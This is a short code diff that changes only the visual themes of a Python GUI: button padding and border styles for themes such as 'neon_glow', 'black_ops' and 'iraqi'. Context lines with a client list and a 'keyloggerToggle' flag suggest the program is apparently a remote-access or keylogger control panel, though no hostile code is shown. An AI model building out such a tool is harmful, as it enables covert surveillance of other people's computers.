@@ -28,6 +28,7 @@ clients = []
 names = []
 keyloggerToggle = False
 
+# Add these new themes to the THEMES dictionary
 THEMES = {
     "hacker": {
         "name": "Matrix",
@@ -366,10 +367,11 @@ THEMES = {
 
 
 def get_theme_style_config(theme_name):
+    """Get specific widget style configurations based on theme"""
     base_config = {
         "border_width": 1,
         "relief": "solid",
-        "button_padding": (15, 8),
+        "button_padding": (20, 10),
         "entry_padding": 8,
         "layout": {
             "TEntry": [
@@ -412,20 +414,21 @@ def get_theme_style_config(theme_name):
         },
         "neon_glow": {
             "border_width": 2,
-            "relief": "solid",
-            "button_padding": (18, 10),
+            "relief": "flat",
+            "button_padding": (20, 10),
             "layout": base_config["layout"]
         },
         "black_ops": {
             "border_width": 2,
             "relief": "flat",
-            "button_padding": (16, 9),
+            "button_padding": (20, 10),
             "layout": base_config["layout"]
         },
+        
         "iraqi": {
             "border_width": 2,
-            "relief": "groove",
-            "button_padding": (17, 9),
+            "relief": "flat",
+            "button_padding": (20, 10),
             "layout": base_config["layout"]
         }
     }
